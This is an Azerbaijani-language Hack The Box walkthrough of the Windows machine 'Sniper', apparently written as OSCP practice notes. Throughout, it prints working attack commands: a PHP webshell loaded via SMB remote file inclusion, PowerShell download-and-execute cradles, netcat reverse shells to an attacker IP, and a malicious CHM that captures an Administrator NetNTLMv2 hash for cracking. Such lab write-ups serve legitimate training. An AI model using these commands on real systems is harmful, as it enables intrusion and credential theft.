# Sniper (HTB)

> Platforma: Hack The Box  
> OS: Windows  
> Çətinlik: Orta  
> Nəticə: Administrator

---

## Hücum Zənciri

```text
Kəşfiyyat
+-- nmap -p- -Pn -> 80 (IIS 10.0), 135, 139, 445, 49667
|-- gobuster -> /blog/ (PHP), /user/ (login + registration)

İlkin Giriş
|-- blog/?lang=/windows/win.ini -> local file inclusion
|-- impacket-smbserver + shell.php -> remote file inclusion
|-- whoami -> nt authority\iusr
+-- type C:\inetpub\wwwroot\user\db.php -> dbuser:<PASSWORD>

Üfüqi Yerdəyişmə
|-- Invoke-Command LOCALHOST as SNIPER\chris (password reuse)
|-- nc.exe -e cmd.exe -> shell as sniper\chris
+-- user.txt

Səlahiyyətlərin Artırılması
|-- C:\Docs\note.txt -> CEO expects a CHM in C:\Docs
|-- malicious instructions.chm with UNC -> Responder
|-- NetNTLMv2 SNIPER\Administrator -> hashcat 5600
|-- <PASSWORD> -> Invoke-Command as Administrator
+-- root.txt
```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---
## Maşın Brifinqi

Windows Server 2019 üzərində Microsoft IIS 10.0 və PHP 7.3 bloqu işləyir. Bloq məzmunu `lang` GET parametri vasitəsilə yüklənir və yolun validasiyası aparılmır - bu, həm lokal, həm də uzaq fayl daxiletməsinə imkan verir. SMB vasitəsilə uzaq daxiletmə `NT AUTHORITY\iUSR` kimi webshell verir. Veb kökündə MySQL bağlantı sətri (`db.php`) açıqdır; verilənlər bazasının şifrəsi `chris` lokal istifadəçisi tərəfindən təkrar istifadə olunur. `chris` istifadəçisindən sonra `C:\Docs` qovluğundakı qeyd göstərir ki, CEO CHM formatında sənədləri nəzərdən keçirir. Bu, Administrator NetNTLMv2 heşini ələ keçirmək və sındırmaq üçün istifadə edilə bilər.

---

## Kəşfiyyat

### Port Skanı

```bash
nmap -p- --min-rate=5000 -T4 -Pn -n 10.129.229.6
```

```text
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
```

```bash
nmap -sC -sV -Pn -n -p80,135,139,445,49667 10.129.229.6
```

```text
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Qovluqların Sadalanması

```bash
gobuster dir -u http://10.129.229.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

```text
images   (Status: 301)
index.php (Status: 200)
blog     (Status: 301)
user     (Status: 301)
css      (Status: 301)
js       (Status: 301)
```

`/blog/` qovluğu `lang` GET parametri olan PHP bloqudur, `/user/` isə giriş və qeydiyyat imkanı verir.
---

## İlkin Giriş

No CVE (custom vulnerability) - bloq tətbiqi `lang` parametrində istifadəçi tərəfindən verilən yolu birbaşa PHP-yə daxil edir, bu da lokal və uzaq fayl daxiletməsinə gətirib çıxarır.

### Lokal Fayl Daxiletmə

Bloqun dilini dəyişdikdə `/blog/?lang=blog-en.php` kimi URL yaranır. `lang` dəyəri PHP tərəfindən birbaşa daxil edilir. Windows PHP burazılışında mütləq yollar qəbul edilir, buna görə traversal ardıcıllığına ehtiyac yoxdur.

```bash
curl -s "http://10.129.229.6/blog/?lang=/windows/win.ini" | tail -12
```

```text
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### SMB vasitəsilə Uzaq Fayl Daxiletmə

Windows PHP `include()` funksiyasında UNC yollarını qəbul edir. Webshell-i SMB üzərindən paylaşdır və birbaşa hədəfdən daxil et.

```bash
mkdir -p /tmp/share
echo '<?php system($_GET["0"]); ?>' > /tmp/share/shell.php
impacket-smbserver share /tmp/share -smb2support
```

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=whoami" | tail -3
```

```text
nt authority\iusr
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Verilənlər Bazası Giriş Məlumatları

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=type%20C:%5Cinetpub%5Cwwwroot%5Cuser%5Cdb.php" | tail -12
```

```text
$con = mysqli_connect("localhost","dbuser","<PASSWORD>","sniper");
```

---

## Üfüqi Yerdəyişmə

### chris İstifadəçisinə Şifrə Təkrarı

Web shell aşağı səlahiyyətli IIS hesabı kimi işləyir. Verilənlər bazasının şifrəsi `chris` lokal istifadəçisi tərəfindən təkrar istifadə olunur. WinRM xaricdən açıq deyil, lakin web shell kontekstindən `LOCALHOST`-a qarşı `Invoke-Command` hələ də işləyir.

```bash
cat > /tmp/www/test-chris.ps1 <<'EOF'
$p = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('SNIPER\chris', $p)
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $c
EOF
```

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=powershell%20-c%20%22iex(New-Object%20Net.WebClient).DownloadString('http://10.10.15.129:8000/test-chris.ps1')%22" | tail -5
```

```text
sniper\chris
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### chris Kimi Shell

```bash
cat > /tmp/www/shell-chris.ps1 <<'EOF'
$p = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('SNIPER\chris', $p)
Invoke-Command -ComputerName LOCALHOST -ScriptBlock {
  iwr http://10.10.15.129:8000/nc.exe -OutFile C:\Users\chris\nc.exe
  C:\Users\chris\nc.exe -e cmd.exe 10.10.15.129 4444
} -Credential $c
EOF
```

```bash
rlwrap nc -lvnp 4444
```

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=powershell%20-c%20%22iex(New-Object%20Net.WebClient).DownloadString('http://10.10.15.129:8000/shell-chris.ps1')%22" | tail -3
```

```text
C:\Users\Chris\Documents>
```

İstifadəçi bayrağı `C:\Users\chris\Desktop\user.txt` faylında yerləşir.
---

## Səlahiyyətlərin Artırılması

### chris Kimi Sadalanma

```text
C:\Users\Chris\Desktop>type C:\Docs\note.txt
Hi Chris,
  Your php skillz suck. Contact yamitenshi so that he teaches you how to use it
  and after that fix the website as there are a lot of bugs on it. And I hope
  that you have prepared the documentation for our new app. Drop it here when
  you are done with it.
Regards,
Sniper CEO.
```

Qeyd göstərir ki, CEO `C:\Docs` qovluğuna CHM faylı gözləyir. CHM (Compiled HTML Help) `hh.exe` vasitəsilə açılır, HTML-i göstərir və daxilindəki UNC istinadlarını izləyir - bu da Windows-un bizim SMB paylaşımımıza autentifikasiya olmasına səbəb olur.

### Zərərli CHM Qurulması

Linux CHM kompilyatorunu quraşdır:

```bash
sudo apt update && sudo apt install -y fp-utils
which chmcmd
```

```text
/usr/bin/chmcmd
```

HTML mənbəyi yarat - UNC `<img>` teqi listener-imizə yönəlsin:

```bash
mkdir -p /tmp/chm && cat > /tmp/chm/index.html <<'EOF'
<!DOCTYPE html>
<html><body>
<h1>New App Documentation</h1>
<img src="\\10.10.15.129\share\test.png" width="1" height="1">
</body></html>
EOF
```

```bash
cat > /tmp/chm/index.hhp <<'EOF'
[OPTIONS]
Compatibility=1.1 or later
Compiled file=instructions.chm
Contents file=index.hhp
Default topic=index.html
Display compile progress=No
Language=0x409 English (United States)

[FILES]
index.html
EOF
```

```bash
cd /tmp/chm && chmcmd index.hhp && cp instructions.chm /tmp/www/
```

```text
Writing CHM instructions.chm
```

### NetNTLMv2 Əldə Edilməsi

```bash
sudo responder -I tun0 -v
```

CHM faylını `chris` shell-indən `C:\Docs` qovluğuna at:

```text
C:\Users\Chris\Desktop>powershell -c "iwr http://10.10.15.129:8000/instructions.chm -OutFile C:\Docs\instructions.chm"
C:\Users\Chris\Desktop>dir C:\Docs\instructions.chm
```

```text
10/26/2026  08:18 PM            10,817 instructions.chm
```

Administrator faylı açdıqda Responder heşi ələ keçirir:

```text
[SMB] NTLMv2-SSP Client   : 10.129.229.6
[SMB] NTLMv2-SSP Username : SNIPER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::SNIPER:<NTLM_RESPONSE>:<SERVER_CHALLENGE>:<NTLM_BLOB>
```

### Heşin Sındırılması

```bash
hashcat -m 5600 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
```

```text
ADMINISTRATOR::SNIPER:...:<PASSWORD>
Status...........: Cracked
```

### Administrator Kimi Shell

```bash
cat > /tmp/www/shell-admin.ps1 <<'EOF'
$p = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('SNIPER\Administrator', $p)
Invoke-Command -ComputerName LOCALHOST -ScriptBlock {
  C:\Users\chris\nc.exe -e cmd.exe 10.10.15.129 5555
} -Credential $c
EOF
```

```bash
rlwrap nc -lvnp 5555
```

`chris` shell-indən tetiklə:

```text
C:\Users\Chris\Desktop>powershell -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.15.129:8000/shell-admin.ps1')"
```

```text
C:\Users\Administrator\Documents>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Bayraqlar

| Bayraq | Dəyər |
|--------|-------|
| İstifadəçi | `<USER_FLAG>` |
| Root | `<ROOT_FLAG>` |

### Bayraq Faylı

```text
C:\Users\chris\Desktop>type C:\Users\chris\Desktop\user.txt
<USER_FLAG>
```

```text
C:\Users\Administrator\Documents>type C:\Users\Administrator\Desktop\root.txt
<ROOT_FLAG>
```

---

## Əsas Nəticələr

- Windows PHP burazılışlarında mütləq yollar traversal filtrlərini keçir; `../../` ilə yanaşı `lang=/windows/win.ini` variantını da yoxla.
- SMB üzərindən uzaq fayl daxiletmə (`\\attacker\share\shell.php`) sessiya zəhərlənməsindən daha sadədir və Windows PHP UNC yollarını qəbul etdikdə işləyir.
- Veb tətbiqinin mənbəyində tapılan giriş məlumatları (`db.php`) tez-tez lokal hesab şifrələri ilə təkrar istifadə olunur. DB istifadəçisinin şifrəsini lokal istifadəçilərə qarşı sına.
- Sızmış qeyd və ya README müştəri tərəfində icra yolunu (CHM, LNK, Office) göstərə bilər. Sənəd qovluğu yazıla biləndirsə, UNC istinadlı zərərli CHM NetNTLMv2 ələ keçirir.
- NetNTLMv2 (`hashcat -m 5600`) zəif şifrə ilə rockyou-dan istifadə edərək tez sındırılır. Sındırdıqdan sonra `PSCredential` ilə `Invoke-Command` WinRM açıq olmadan shell verir.
- Hər mərhələnin ekran görüntüsünü götür: `whoami` ilkin girişdən sonra, üfüqi yerdəyişmədən sonra və səlahiyyətlərin artırılmasından sonra - hər OSCP markerinə bir.